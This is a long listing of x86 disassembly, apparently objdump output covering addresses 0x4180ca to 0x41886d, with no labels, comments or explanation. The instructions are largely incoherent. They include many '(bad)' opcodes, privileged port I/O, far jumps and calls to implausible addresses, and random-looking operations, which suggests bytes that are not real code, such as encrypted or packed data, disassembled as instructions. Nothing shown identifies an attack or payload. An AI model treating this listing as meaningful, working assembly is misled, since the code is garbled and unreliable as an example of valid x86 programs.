  4180ca:	pop    es
  4180cb:	add    bh,0x83
  4180ce:	fwait
  4180cf:	xor    al,0xf4
  4180d1:	inc    esp
  4180d2:	pop    ss
  4180d3:	mov    edi,0x90575df5
  4180d8:	and    DWORD PTR [eax],ebp
  4180da:	add    eax,0x6894bdc0
  4180df:	outs   dx,BYTE PTR ds:[esi]
  4180e0:	xchg   edx,eax
  4180e1:	popa   
  4180e2:	dec    esp
  4180e3:	or     ebp,esi
  4180e5:	daa    
  4180e6:	mov    BYTE PTR [esi],ah
  4180e8:	inc    edx
  4180e9:	pop    es
  4180ea:	mov    al,ds:0x2f8d1162
  4180ef:	aad    0xa8
  4180f1:	mov    eax,0xd0a3ba26
  4180f6:	sahf   
  4180f7:	and    al,0xbc
  4180f9:	xor    BYTE PTR [edx],ch
  4180fb:	or     bh,al
  4180fd:	inc    ebp
  4180fe:	dec    ebx
  4180ff:	test   BYTE PTR [ebp+ebx*4-0xc],ah
  418103:	les    ecx,FWORD PTR [eax]
  418105:	loopne 0x418175
  418107:	rcr    DWORD PTR [ebx+0x55e298e5],0x3c
  41810e:	into   
  41810f:	pushf  
  418110:	std    
  418111:	jge    0x4180cb
  418113:	xor    al,0x9f
  418115:	out    0x8b,eax
  418117:	inc    esi
  418118:	sub    eax,0x5f12a49e
  41811d:	cs out 0x4d,al
  418120:	sbb    eax,0xe0e4ca51
  418125:	mov    esp,0x9f44c09f
  41812a:	out    dx,al
  41812b:	stos   BYTE PTR es:[edi],al
  41812c:	inc    ebx
  41812d:	sub    esp,DWORD PTR [edi+0x25]
  418130:	and    ch,dl
  418132:	cmp    BYTE PTR [ecx],ch
  418134:	div    cl
  418136:	pop    ebx
  418137:	dec    esi
  418138:	je     0x4181ac
  41813a:	cmp    al,0xeb
  41813c:	out    0xa2,eax
  41813e:	aad    0x1c
  418140:	sbb    DWORD PTR [esi],0x193c3f2b
  418146:	fucomp st(1)
  418148:	xchg   esi,eax
  418149:	mov    eax,ds:0xc494ea57
  41814e:	inc    ebx
  41814f:	in     eax,0x2f
  418151:	mov    ebx,0x4107fa0c
  418156:	(bad)  
  418157:	adc    bl,ch
  418159:	addr16 and ebx,ecx
  41815c:	add    eax,0xb8042a5
  418161:	dec    BYTE PTR [edi+0x7776aae6]
  418167:	inc    esi
  418168:	pop    ebx
  418169:	cmp    eax,0x59047b07
  41816e:	sub    dl,ah
  418170:	lea    edx,[edi+0x56]
  418173:	mov    BYTE PTR ds:0xbffeed47,ah
  418179:	shr    DWORD PTR [ebx+ebp*1+0x5430495d],cl
  418180:	xchg   BYTE PTR [esi-0x5f],ah
  418183:	pop    esp
  418184:	cmp    bl,dl
  418186:	je     0x418116
  418188:	pop    edi
  418189:	mov    esp,0xd719d991
  41818e:	lods   eax,DWORD PTR ds:[esi]
  41818f:	loope  0x418157
  418191:	out    0xb6,al
  418193:	imul   ecx,eax,0x5e
  418196:	test   eax,0x84ed0cd7
  41819b:	sub    BYTE PTR [edx+0x1e],ah
  41819e:	cli    
  41819f:	inc    esp
  4181a0:	cmp    DWORD PTR [eax+0x3],ebp
  4181a3:	sbb    ecx,DWORD PTR ds:0x3fa1df0e
  4181a9:	punpckhdq mm2,mm1
  4181ac:	dec    esp
  4181ad:	add    eax,ebp
  4181af:	xlat   BYTE PTR ds:[ebx]
  4181b0:	cld    
  4181b1:	pushf  
  4181b2:	adc    al,0x7
  4181b4:	or     eax,DWORD PTR [ebp+0x7e]
  4181b7:	mov    bh,0x4e
  4181b9:	sbb    dh,BYTE PTR [ecx]
  4181bb:	cli    
  4181bc:	retf   
  4181bd:	push   edx
  4181be:	adc    al,BYTE PTR [ebx+0x12]
  4181c1:	jno    0x41817f
  4181c3:	std    
  4181c4:	xor    DWORD PTR [ebx+0x12],eax
  4181c7:	pop    ebx
  4181c8:	imul   edi,eax,0xefad1588
  4181ce:	(bad)  
  4181d0:	hlt    
  4181d1:	gs iret 
  4181d3:	iret   
  4181d4:	leave  
  4181d5:	mov    al,ds:0xa3fc27f4
  4181da:	or     bl,ah
  4181dc:	pop    ss
  4181dd:	xchg   BYTE PTR [ebp+edx*4+0x40594f31],ah
  4181e4:	cdq    
  4181e5:	(bad)  
  4181e6:	or     BYTE PTR [eax-0x7c2e86e2],ah
  4181ec:	in     eax,0x39
  4181ee:	rol    BYTE PTR [edx],0xb8
  4181f1:	push   0xffffffcb
  4181f3:	inc    ecx
  4181f4:	pop    ds
  4181f5:	dec    esi
  4181f6:	stos   DWORD PTR es:[edi],eax
  4181f7:	loopne 0x41820a
  4181f9:	icebp  
  4181fa:	loopne 0x418267
  4181fc:	cwde   
  4181fd:	mov    cl,0xd2
  4181ff:	fimul  DWORD PTR [edx+0x603f24d]
  418205:	lds    ebx,FWORD PTR [edi]
  418207:	nop
  418208:	shr    DWORD PTR [edx],0x8f
  41820b:	mov    ecx,0xfba87bd9
  418210:	push   0xffffffff
  418212:	push   0x167d7c53
  418217:	test   BYTE PTR [edx*4+0x1c07594e],ch
  41821e:	mov    ebx,0xc1419c90
  418223:	push   es
  418224:	call   0xe447ca51
  418229:	ja     0x418240
  41822b:	out    dx,al
  41822c:	push   ebx
  41822d:	ret    0x27e
  418230:	mov    al,ds:0x572cc320
  418235:	sub    ecx,DWORD PTR [ebp+esi*8-0x3c5eae55]
  41823c:	retf   0x2621
  41823f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418240:	sub    DWORD PTR [ebx-0x7c4a7bfd],edi
  418246:	pop    es
  418247:	add    al,0x9a
  418249:	outs   dx,DWORD PTR ds:[esi]
  41824a:	cmp    bh,BYTE PTR [ecx]
  41824c:	test   eax,0xd3f99bac
  418251:	ja     0x4182a7
  418253:	fld    TBYTE PTR [eiz*2+0x2a4652be]
  41825a:	jbe    0x418244
  41825c:	jb     0x4181f5
  41825e:	jbe    0x418267
  418260:	inc    edx
  418261:	mov    esi,0x7e037727
  418266:	xchg   edx,eax
  418267:	mov    ebp,0x1c75cba
  41826c:	mov    bl,0x8f
  41826e:	inc    esp
  41826f:	ins    DWORD PTR es:[edi],dx
  418270:	rol    BYTE PTR [ebp+0x78cb71d1],cl
  418276:	or     esp,DWORD PTR [esp+ecx*2]
  418279:	repnz in eax,0x79
  41827c:	sub    al,0x9f
  41827e:	lahf   
  41827f:	js     0x41827f
  418281:	ins    BYTE PTR es:[edi],dx
  418282:	pop    edi
  418283:	and    ebp,eax
  418285:	nop
  418286:	ins    DWORD PTR es:[edi],dx
  418287:	pop    ebx
  418288:	xchg   ebp,eax
  418289:	jmp    0x1158:0xdbca9b68
  418290:	int    0xe4
  418292:	and    DWORD PTR [ecx+eax*2-0x42],esp
  418296:	xor    BYTE PTR [edx-0x158aff5c],bl
  41829c:	loopne 0x418270
  41829e:	and    eax,DWORD PTR ds:0x21a9c6be
  4182a4:	and    DWORD PTR [eax+0x39ae361a],0xffffff97
  4182ab:	and    al,0x34
  4182ad:	loope  0x418277
  4182af:	xor    dh,ah
  4182b1:	mov    DWORD PTR [edi],ebx
  4182b3:	arpl   WORD PTR [edx+0x65fa614b],sp
  4182b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182ba:	push   eax
  4182bb:	imul   ebp,DWORD PTR [esi-0x64684d51],0xffffff90
  4182c2:	imul   edi,DWORD PTR [eax+ebx*2+0x12],0x16d95be
  4182ca:	jmp    0x4182dc
  4182cc:	std    
  4182cd:	daa    
  4182ce:	pop    esi
  4182cf:	add    ebx,edx
  4182d1:	outs   dx,DWORD PTR ds:[esi]
  4182d2:	xchg   esp,eax
  4182d3:	jle    0x41832c
  4182d5:	pop    ss
  4182d6:	or     bl,BYTE PTR [eax]
  4182d8:	inc    esi
  4182d9:	test   DWORD PTR [edx+0x6b],eax
  4182dc:	mov    ebp,0xaf80fe25
  4182e1:	arpl   WORD PTR gs:[edx],bp
  4182e4:	scas   eax,DWORD PTR es:[edi]
  4182e5:	(bad)  [ecx+0x58329667]
  4182eb:	mov    eax,0xa67c76b
  4182f0:	adc    eax,0x6aa932a4
  4182f5:	xor    al,0x49
  4182f7:	outs   dx,DWORD PTR ds:[esi]
  4182f8:	sar    edx,1
  4182fa:	cs inc ecx
  4182fc:	cdq    
  4182fd:	dec    edx
  4182fe:	aam    0xe0
  418300:	(bad)  
  418301:	xlat   BYTE PTR ds:[ebx]
  418302:	mov    ecx,0xcd7ac358
  418307:	std    
  418308:	into   
  418309:	in     al,dx
  41830a:	or     ch,dl
  41830c:	push   es
  41830d:	test   al,0xf7
  41830f:	inc    esp
  418310:	rol    cl,cl
  418312:	mov    BYTE PTR [esi-0xe],cl
  418315:	pop    esi
  418316:	jl     0x41834a
  418318:	xor    ebp,esi
  41831a:	retf   
  41831b:	aas    
  41831c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41831d:	xchg   edi,eax
  41831e:	push   ds
  41831f:	enter  0xbe14,0x21
  418323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418324:	inc    ebp
  418325:	push   eax
  418326:	mov    al,ds:0x15cbe59c
  41832b:	pop    ebx
  41832c:	push   cs
  41832d:	jle    0x4182d1
  41832f:	mov    esi,0x63aa37b6
  418334:	push   eax
  418335:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418336:	mov    bh,0x55
  418338:	lods   al,BYTE PTR ds:[esi]
  418339:	mov    esp,0x279b13df
  41833e:	mov    edx,0x56b47bc9
  418343:	jp     0x418382
  418345:	popf   
  418346:	cld    
  418347:	call   0xa712:0xfce90e23
  41834e:	and    cl,BYTE PTR [ebp+0x5a]
  418351:	jne    0x418345
  418353:	inc    eax
  418354:	test   al,0xa
  418356:	and    ch,al
  418358:	out    0xd7,eax
  41835a:	aas    
  41835b:	enter  0xf79c,0x9a
  41835f:	jl     0x418351
  418361:	clc    
  418362:	sub    eax,0x19587db4
  418367:	in     al,dx
  418368:	clc    
  418369:	add    esi,ebp
  41836b:	popf   
  41836c:	fdivr  st(3),st
  41836e:	iret   
  41836f:	lds    eax,FWORD PTR [eax-0x14449363]
  418375:	mov    ebx,0xb7cb1e27
  41837a:	arpl   WORD PTR [eax-0x1f3d3597],bp
  418380:	arpl   si,bp
  418382:	(bad)  
  418383:	cmp    al,ch
  418385:	pop    ebp
  418386:	xlat   BYTE PTR ds:[ebx]
  418387:	and    dl,BYTE PTR [esi]
  418389:	mov    ah,0xb5
  41838b:	and    esi,DWORD PTR [edi-0xa]
  41838e:	sbb    ebp,DWORD PTR [ebp+ecx*8-0x4ad95b17]
  418395:	loopne 0x4183f5
  418397:	icebp  
  418398:	pop    ds
  418399:	xor    eax,0x43929fe9
  41839e:	leave  
  41839f:	xlat   BYTE PTR ds:[ebx]
  4183a0:	sbb    dh,cl
  4183a2:	int    0x2a
  4183a4:	neg    BYTE PTR [ebp+0x2f3734d]
  4183aa:	adc    eax,0x52e7192e
  4183af:	(bad)  
  4183b0:	arpl   WORD PTR [edx+esi*2+0x501b6bba],cx
  4183b7:	sbb    al,0xa4
  4183b9:	dec    edx
  4183ba:	ror    BYTE PTR [edx],0x39
  4183bd:	scas   eax,DWORD PTR es:[edi]
  4183be:	cmc    
  4183bf:	push   ds
  4183c0:	inc    eax
  4183c1:	push   edx
  4183c2:	fldpi  
  4183c4:	push   ecx
  4183c5:	or     al,0x19
  4183c7:	sahf   
  4183c8:	jl     0x418419
  4183ca:	cmp    eax,eax
  4183cc:	add    cl,BYTE PTR [edx-0x52efa31f]
  4183d2:	xchg   ecx,eax
  4183d3:	sub    bl,ah
  4183d5:	inc    esp
  4183d6:	jecxz  0x4183c1
  4183d8:	outs   dx,DWORD PTR ds:[esi]
  4183d9:	and    al,0x3d
  4183db:	push   es
  4183dc:	pop    eax
  4183dd:	das    
  4183de:	into   
  4183df:	in     al,dx
  4183e0:	ins    BYTE PTR es:[edi],dx
  4183e1:	xor    eax,0xf7ba65aa
  4183e6:	pushf  
  4183e7:	pop    ebp
  4183e8:	cmc    
  4183e9:	nop
  4183ea:	xor    al,BYTE PTR [edx-0x124f828b]
  4183f0:	mov    cl,0x93
  4183f2:	xrelease mov DWORD PTR [ebx-0x69],eax
  4183f6:	in     al,0x50
  4183f8:	enter  0xf0fa,0xff
  4183fc:	into   
  4183fd:	mov    edi,0x3a8b4cc9
  418402:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418403:	(bad)  
  418405:	(bad)  
  418406:	hlt    
  418407:	lahf   
  418408:	fadd   DWORD PTR [ebp-0x62]
  41840b:	in     eax,dx
  41840c:	xchg   esi,eax
  41840d:	xor    ch,BYTE PTR [edi]
  41840f:	out    dx,eax
  418410:	outs   dx,DWORD PTR ds:[esi]
  418411:	sbb    edi,DWORD PTR [ebx]
  418413:	lock aas 
  418415:	xchg   ebp,eax
  418416:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418417:	in     eax,0xce
  418419:	mov    WORD PTR [eax+ebp*4-0x6e],ds
  41841d:	loop   0x418404
  41841f:	shr    DWORD PTR [edi+0x10],1
  418422:	lahf   
  418423:	stos   BYTE PTR es:[edi],al
  418424:	fidivr WORD PTR ds:0xe79266c0
  41842a:	scas   al,BYTE PTR es:[edi]
  41842b:	mov    bl,0x19
  41842d:	sti    
  41842e:	cld    
  41842f:	mov    ebx,0xc9522e2b
  418434:	fimul  WORD PTR [eax+0x44]
  418437:	fsub   DWORD PTR [edi]
  418439:	push   ebx
  41843a:	dec    edx
  41843b:	xor    ebp,DWORD PTR [ecx]
  41843d:	xchg   ecx,eax
  41843e:	ror    DWORD PTR [edx],1
  418440:	sub    al,0x8f
  418442:	jne    0x418464
  418444:	fucomip st,st(1)
  418446:	jge    0x418491
  418448:	push   esi
  418449:	addr16 xor dh,ah
  41844c:	mov    ebx,0x89c560a3
  418451:	or     al,0xc7
  418453:	xor    eax,0x17cec47c
  418458:	sub    esp,0xffffffd0
  41845b:	push   ds
  41845c:	mul    BYTE PTR [ecx+0x15]
  41845f:	cmp    bh,BYTE PTR [edx]
  418461:	jbe    0x4183e6
  418463:	mov    bh,0x73
  418465:	lods   al,BYTE PTR ds:[esi]
  418466:	jmp    0x5aac3b18
  41846b:	fisttp DWORD PTR [eax]
  41846d:	lods   al,BYTE PTR ds:[esi]
  41846e:	test   al,0x59
  418470:	mov    eax,0x82c8d9d5
  418475:	je     0x4184f6
  418477:	pop    ecx
  418478:	sub    al,0x7b
  41847a:	push   ecx
  41847b:	push   eax
  41847c:	aad    0xa
  41847e:	push   ebx
  41847f:	xor    eax,0x4633001e
  418484:	sub    DWORD PTR [esi],ebp
  418486:	mov    eax,ds:0x965091cc
  41848b:	bound  esp,QWORD PTR [eax]
  41848d:	test   BYTE PTR [edx-0x43c8be84],cl
  418493:	sbb    BYTE PTR ds:0x2e1fe6e8,ah
  418499:	or     edx,DWORD PTR [esi]
  41849b:	test   BYTE PTR [ecx],cl
  41849d:	arpl   WORD PTR [esi+ebx*2+0x70],dx
  4184a1:	repnz in eax,0x59
  4184a4:	ss dec esi
  4184a6:	push   ds
  4184a7:	inc    esi
  4184a8:	xor    eax,0xd5bf82f
  4184ad:	inc    ebx
  4184ae:	adc    edi,DWORD PTR [edx]
  4184b0:	inc    ebx
  4184b1:	fist   DWORD PTR [ecx]
  4184b3:	cdq    
  4184b4:	push   0xbb2e93fb
  4184b9:	(bad)  
  4184ba:	pushf  
  4184bb:	sub    BYTE PTR [ebp+0x30],ah
  4184be:	outs   dx,DWORD PTR ds:[esi]
  4184bf:	sbb    al,0x29
  4184c1:	ror    ebp,cl
  4184c3:	and    BYTE PTR [ebx+0xe],0x54
  4184c7:	in     al,dx
  4184c8:	add    al,0x1d
  4184ca:	bound  esp,QWORD PTR [edx-0x43]
  4184cd:	arpl   WORD PTR [edx+0x62],bx
  4184d0:	cmp    al,0x23
  4184d2:	inc    ecx
  4184d3:	and    eax,0x9f8958c6
  4184d8:	out    0x44,al
  4184da:	in     eax,0xdc
  4184dc:	cld    
  4184dd:	outs   dx,BYTE PTR ds:[esi]
  4184de:	xor    al,0x91
  4184e0:	pop    esp
  4184e1:	inc    ecx
  4184e2:	inc    ebp
  4184e3:	cmp    al,0x73
  4184e5:	in     eax,dx
  4184e6:	daa    
  4184e7:	jno    0x418486
  4184e9:	sub    eax,0x62c96a34
  4184ee:	pop    ecx
  4184ef:	add    eax,0xe5eaaa9d
  4184f4:	xchg   esp,eax
  4184f5:	and    BYTE PTR [eax+edx*1+0x3878eb95],0x6b
  4184fd:	sub    esi,DWORD PTR [ebp-0x4e]
  418500:	and    edi,esp
  418502:	clc    
  418503:	nop
  418504:	ins    BYTE PTR es:[edi],dx
  418505:	cld    
  418506:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418507:	and    eax,DWORD PTR [edi-0x36]
  41850a:	addr16 jns 0x418550
  41850d:	mul    DWORD PTR [ebx*1+0x4444bc2]
  418514:	pushf  
  418515:	pop    es
  418516:	mov    ds:0x493c03c5,al
  41851b:	mov    al,0x50
  41851d:	ins    BYTE PTR es:[edi],dx
  41851e:	xor    eax,DWORD PTR [eax+0x6b]
  418521:	fsub   QWORD PTR [eax-0x68]
  418524:	sub    al,0xc
  418526:	fsub   DWORD PTR ds:0xfdde7c20
  41852d:	jle    0x4184b6
  41852f:	cmp    eax,0xc4fae8c
  418534:	mov    ecx,0x834cc109
  418539:	(bad)  
  41853a:	mov    ds:0x6d07bdcf,eax
  41853f:	xlat   BYTE PTR ds:[ebx]
  418540:	pop    es
  418541:	cmp    al,0x6d
  418543:	mov    ecx,ebp
  418545:	push   esi
  418546:	or     DWORD PTR [ebx+eiz*8],esi
  418549:	xchg   esi,eax
  41854a:	xchg   esp,eax
  41854b:	cmp    BYTE PTR [ecx+0x4e],bh
  41854e:	cmp    eax,0x1beace77
  418553:	inc    ecx
  418554:	pusha  
  418555:	fldcw  WORD PTR [eax+ebx*2]
  418558:	mov    dh,0xb2
  41855a:	js     0x41850c
  41855c:	jae    0x418555
  41855e:	pop    esp
  41855f:	out    0x47,al
  418561:	mov    ebx,gs
  418563:	inc    ebx
  418564:	jbe    0x41851f
  418566:	lea    edi,[edx+0x37]
  418569:	aam    0x7d
  41856b:	xchg   ecx,eax
  41856c:	mov    eax,0xe66f0a51
  418571:	mov    ah,0xf4
  418573:	test   BYTE PTR [esi-0x46],cl
  418576:	add    esi,DWORD PTR [edx]
  418578:	(bad)  
  418579:	push   edx
  41857a:	push   edx
  41857b:	sub    al,0x98
  41857d:	jb     0x418577
  41857f:	shr    DWORD PTR [eax+0x35],0xa4
  418583:	pop    ds
  418584:	jne    0x418555
  418586:	jnp    0x418520
  418588:	aas    
  418589:	cmc    
  41858a:	jle    0x4185d1
  41858c:	xor    dl,bh
  41858e:	and    DWORD PTR [ebp+0x54a8cbcf],ebp
  418594:	repz gs pop di
  418598:	out    dx,al
  418599:	add    bh,ah
  41859b:	xchg   ecx,eax
  41859c:	in     al,0x4a
  41859e:	or     ah,BYTE PTR [ebx+0x6996fc33]
  4185a4:	clc    
  4185a5:	sbb    eax,0x7adb3dca
  4185aa:	mov    eax,0xdeb99739
  4185af:	lsl    esi,di
  4185b2:	leave  
  4185b3:	std    
  4185b4:	sub    DWORD PTR [eax],ecx
  4185b6:	sbb    eax,0x2147fe1f
  4185bb:	aaa    
  4185bc:	pop    ecx
  4185bd:	jmp    0x4185fb
  4185bf:	and    BYTE PTR [edx],bh
  4185c1:	xor    esp,DWORD PTR [eax+ebp*8+0x73]
  4185c5:	inc    ecx
  4185c6:	inc    ecx
  4185c7:	cmp    al,BYTE PTR [eax-0x45cd23b7]
  4185cd:	cwde   
  4185ce:	pushf  
  4185cf:	xor    BYTE PTR [ecx+ebx*2+0x5f5c3f98],ch
  4185d6:	test   DWORD PTR [ecx],edx
  4185d8:	aaa    
  4185d9:	out    0xd2,eax
  4185db:	sahf   
  4185dc:	daa    
  4185dd:	dec    eax
  4185de:	retf   
  4185df:	(bad)  
  4185e0:	mov    edx,0x9ccebcdf
  4185e5:	xor    esp,DWORD PTR [ebx]
  4185e7:	or     ebp,0x6a
  4185ea:	fbstp  TBYTE PTR [ecx]
  4185ec:	pop    eax
  4185ed:	cmp    al,0x62
  4185ef:	retf   
  4185f0:	fdiv   DWORD PTR [edi]
  4185f2:	aaa    
  4185f3:	jl     0x41859e
  4185f5:	int3   
  4185f6:	aad    0x53
  4185f8:	mov    dl,0xc1
  4185fa:	sahf   
  4185fb:	add    ebp,DWORD PTR [edx+esi*2+0x1c]
  4185ff:	jmp    FWORD PTR [ebx]
  418601:	jmp    0x89be:0xb7a81141
  418608:	scas   eax,DWORD PTR es:[edi]
  418609:	cmp    eax,0xd7d74d2f
  41860e:	dec    esp
  41860f:	sub    DWORD PTR [ecx],ebx
  418611:	int3   
  418612:	shl    BYTE PTR [ebp-0x1f],cl
  418615:	adc    ebp,ecx
  418617:	pop    ds
  418618:	rcl    BYTE PTR [edx],1
  41861a:	cs mov dh,0xcc
  41861d:	xor    ch,BYTE PTR [edi-0x1]
  418620:	or     cl,cl
  418622:	mov    ds:0x83f7038a,eax
  418627:	xchg   ebx,eax
  418628:	repz jg 0x4185ae
  41862b:	mov    cl,0x72
  41862d:	imul   esp,edx,0x2fc0b581
  418633:	outs   dx,DWORD PTR ds:[esi]
  418634:	sbb    dh,BYTE PTR [edi+0x70]
  418637:	scas   eax,DWORD PTR es:[edi]
  418638:	pop    esi
  418639:	jae    0x41863b
  41863b:	pop    ebx
  41863c:	or     esp,ecx
  41863e:	push   edi
  41863f:	xor    bh,bl
  418641:	or     ebp,DWORD PTR [esi-0x36]
  418644:	call   0x839509a5
  418649:	repz mov al,0x2d
  41864c:	mov    WORD PTR [eax+0x57],es
  41864f:	stos   DWORD PTR es:[edi],eax
  418650:	jmp    DWORD PTR [ebp+0x65]
  418653:	(bad)  
  418654:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418655:	xor    eax,0x62dfb52d
  41865a:	xor    edi,DWORD PTR [eax]
  41865c:	cwde   
  41865d:	popa   
  41865e:	xor    al,0x8b
  418660:	jae    0x418639
  418662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418663:	mov    esp,0xf7feabe7
  418668:	jns    0x41864d
  41866a:	iret   
  41866b:	xor    BYTE PTR [edx],0x34
  41866e:	push   edi
  41866f:	push   edi
  418670:	in     al,0x61
  418672:	push   ss
  418673:	pop    edi
  418674:	lahf   
  418675:	mov    ds:0xa177812e,al
  41867a:	pop    ds
  41867b:	ss xchg dh,bl
  41867e:	mov    dh,0xa3
  418680:	int    0x7c
  418682:	fcomp  DWORD PTR [edi]
  418684:	mov    esp,0x92ef4a40
  418689:	test   DWORD PTR [ecx],eax
  41868b:	jmp    0x4f07d108
  418690:	(bad)  
  418691:	mov    ah,0x40
  418693:	sub    ebp,ebp
  418695:	aad    0xf9
  418697:	out    0xfe,al
  418699:	leave  
  41869a:	data16 mov ch,BYTE PTR [ecx-0x351cfc50]
  4186a1:	pop    ebp
  4186a2:	test   al,0x5d
  4186a4:	bndstx [edx+0x3f],(bad)
  4186a8:	lods   al,BYTE PTR ds:[esi]
  4186a9:	or     DWORD PTR [edi+0x3d44c43a],esi
  4186af:	xchg   BYTE PTR [ebx+0xe],ah
  4186b2:	push   ebp
  4186b3:	in     eax,0x9f
  4186b5:	lock cmp BYTE PTR [esi+0x4a38d04a],0x53
  4186bd:	push   0xffffffd8
  4186bf:	or     esi,DWORD PTR [esi+eax*2+0x6565ef1d]
  4186c6:	and    BYTE PTR [esp+esi*4-0x5469e153],0x83
  4186ce:	jne    0x4186b4
  4186d0:	push   0xffffff94
  4186d2:	cdq    
  4186d3:	mov    ds:0x4e5a2f89,eax
  4186d8:	lea    esp,[ebp-0x37]
  4186db:	popf   
  4186dc:	popf   
  4186dd:	pop    esi
  4186de:	jnp    0x4186ab
  4186e0:	jp     0x418699
  4186e2:	mov    edi,0xa33b5571
  4186e7:	sbb    eax,0x14c101c2
  4186ec:	or     al,0x76
  4186ee:	mov    WORD PTR [ebp+eiz*4-0x19],cs
  4186f2:	imul   edi,DWORD PTR [ecx+eax*2-0x585d9c22],0xd5e5c8a
  4186fd:	xor    DWORD PTR [esi+0x6b],esi
  418700:	or     eax,0xc167e52
  418705:	pushf  
  418706:	dec    esp
  418707:	add    al,0xec
  418709:	sub    edi,DWORD PTR [esi+0x65]
  41870c:	je     0x418739
  41870e:	aad    0x9f
  418710:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418711:	mov    ebx,0xa2eaaf50
  418716:	popf   
  418717:	xlat   BYTE PTR ds:[ebx]
  418718:	mov    esp,0x1eef4c9d
  41871d:	jecxz  0x4186b8
  41871f:	mov    ds:0xcd660304,eax
  418724:	adc    eax,esp
  418726:	jns    0x4186e7
  418728:	mov    BYTE PTR [edi+esi*1-0x41],al
  41872c:	mov    eax,ds:0x9bbee7b1
  418731:	xor    esi,DWORD PTR [esp]
  418734:	xor    BYTE PTR ds:0x2e7d0d74,ah
  41873a:	xor    DWORD PTR [edi+0x52],esi
  41873d:	outs   dx,BYTE PTR ds:[esi]
  41873e:	add    dh,ah
  418740:	mov    ds:0x1d0666e4,eax
  418745:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418746:	pop    ss
  418747:	dec    ebp
  418748:	xchg   ebx,eax
  418749:	ss jl  0x418794
  41874c:	ror    BYTE PTR [edi+0x40928eb2],1
  418752:	pop    esp
  418753:	push   0xffffffea
  418755:	xor    al,0x15
  418757:	sbb    BYTE PTR [ebx+0x49],ah
  41875a:	rol    BYTE PTR [edi+0x6c],1
  41875d:	scas   al,BYTE PTR es:[edi]
  41875e:	gs add eax,0xacab74ae
  418764:	xchg   esi,eax
  418765:	cli    
  418766:	sbb    al,0xc3
  418768:	jecxz  0x4187e3
  41876a:	dec    ebx
  41876b:	or     cl,BYTE PTR [ecx-0x5a7bbdad]
  418771:	or     al,0x78
  418774:	pop    eax
  418775:	std    
  418776:	jg     0x418744
  418778:	pushf  
  418779:	push   ebp
  41877a:	in     al,0x64
  41877c:	mov    eax,0xf78312f3
  418781:	dec    ebp
  418782:	push   ecx
  418783:	jmp    0x41872c
  418785:	inc    esi
  418786:	cmp    cl,BYTE PTR [ebx+ebx*4+0x6a83f1c8]
  41878d:	mov    al,ds:0xd1dfb9e5
  418792:	push   edx
  418793:	sub    al,0x14
  418795:	arpl   WORD PTR [ebp+0x20e38729],cx
  41879b:	pop    ss
  41879c:	mov    BYTE PTR [eax-0x61],0x63
  4187a0:	jmp    0x260901f1
  4187a5:	(bad)  
  4187a7:	pop    eax
  4187a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187a9:	imul   edx,DWORD PTR [esp+ecx*1-0x758468b8],0x4f
  4187b1:	fldenv [eax-0x27b7e7a8]
  4187b7:	inc    ebp
  4187b8:	push   es
  4187b9:	lods   al,BYTE PTR ds:[esi]
  4187ba:	inc    eax
  4187bb:	dec    ebp
  4187bc:	adc    dh,BYTE PTR [ecx+0x79]
  4187bf:	test   BYTE PTR [edx+ecx*2],0x40
  4187c3:	jp     0x41879c
  4187c5:	inc    esp
  4187c6:	adc    BYTE PTR [ebx],dl
  4187c8:	enter  0x63d9,0xe2
  4187cc:	test   eax,0x10840015
  4187d1:	ins    BYTE PTR es:[edi],dx
  4187d2:	cdq    
  4187d3:	outs   dx,BYTE PTR ds:[esi]
  4187d4:	and    eax,0xa211ac82
  4187d9:	xchg   ecx,eax
  4187da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187db:	cmp    ebp,DWORD PTR [ebx+eax*8+0x69]
  4187df:	jbe    0x41881a
  4187e1:	inc    edi
  4187e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187e3:	sbb    ebp,DWORD PTR [ecx-0x62e2cee7]
  4187e9:	popf   
  4187ea:	fcmovu st,st(2)
  4187ec:	inc    eax
  4187ed:	ds es inc ebp
  4187f0:	add    ecx,DWORD PTR [esi+esi*8]
  4187f3:	popf   
  4187f4:	(bad)  
  4187f5:	fs and al,0x72
  4187f8:	in     al,0x21
  4187fa:	xlat   BYTE PTR ds:[ebx]
  4187fb:	xor    dl,bh
  4187fd:	adc    ebp,esp
  4187ff:	fldenv [eax+0x117209c8]
  418805:	mov    ebp,0x60481757
  41880a:	aad    0xe3
  41880c:	jg     0x418794
  41880e:	fmul   QWORD PTR ds:0xfabed11c
  418814:	inc    esp
  418815:	shl    DWORD PTR [edx-0x5d],0xf5
  418819:	ds adc ebp,ebp
  41881c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41881d:	lea    esi,[ebp+ecx*8-0x6bca5daa]
  418824:	ins    BYTE PTR es:[edi],dx
  418825:	inc    ebx
  418826:	rcl    DWORD PTR [ecx-0x31],cl
  418829:	clc    
  41882a:	sbb    ebx,ebx
  41882c:	int    0xe0
  41882e:	add    ecx,esp
  418830:	and    BYTE PTR ds:0xdf9a6812,ch
  418836:	dec    eax
  418837:	mov    al,BYTE PTR [ebx+0x6b0aea2a]
  41883d:	fcom   QWORD PTR [eax-0x39506e22]
  418843:	pop    esp
  418844:	xor    DWORD PTR [esp+ebp*2-0x4216bf16],ebx
  41884b:	mov    edi,0xa71b5cf3
  418850:	cdq    
  418851:	inc    ecx
  418852:	inc    edi
  418853:	les    edi,FWORD PTR ds:0x101ce6b
  418859:	adc    BYTE PTR [esi],cl
  41885b:	sub    dl,cl
  41885d:	out    dx,eax
  41885e:	jns    0x41888c
  418860:	jl     0x418845
  418862:	and    al,0x13
  418864:	jge    0x4188d8
  418866:	fdivp  st(0),st
  418868:	dec    ebp
  418869:	cmp    ebp,DWORD PTR [ecx-0x16]
  41886c:	pop    ebx
  41886d:	ds mov dx,0x701b
